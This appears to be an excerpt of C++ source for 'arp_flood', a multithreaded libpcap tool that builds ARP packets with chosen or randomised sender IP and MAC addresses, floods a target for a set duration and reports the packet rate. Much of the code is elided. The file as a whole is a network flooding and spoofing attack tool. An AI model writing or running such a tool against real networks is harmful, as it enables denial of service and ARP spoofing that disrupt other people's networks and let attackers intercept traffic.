// g++ -O2 -pthread arp_flood.cpp -o NParpT -lpcap -std=c++11
#include <pcap.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
...
public:
    ...
    PrebuiltPacket(uint32_t src_ip, const uint8_t* src_mac,
        ...
        size_t total = sizeof(my_eth_header) + sizeof(my_arp_header);
        ...
        my_arp_header* arp = (my_arp_header*)(buffer.data() + sizeof(my_eth_header));
        arp->htype = htons(1);
        ...
        src_mac_offset = offsetof(my_eth_header, src_mac);
        src_ip_offset = sizeof(my_eth_header) + offsetof(my_arp_header, sender_ip);
    }
    ...
    void set_src_mac(const uint8_t* mac) {
        memcpy(data() + src_mac_offset, mac, 6);
        memcpy(data() + sizeof(my_eth_header) + offsetof(my_arp_header, sender_mac), mac, 6);
    }
...
int main(int argc, char* argv[]) {
    if (argc < 5) {
        fprintf(stderr, "Usage: %s <src_ip> <dst_ip> <threads> <duration> [dst_mac] [--random-ip] [--random-mac]\n", argv[0]);
        return 1;
    }
    ...
    PrebuiltPacket pkt(src_ip, src_mac, dst_ip, dst_mac);
    ...
    double mbps = pps * sizeof(my_eth_header) * 8 / 1e6;
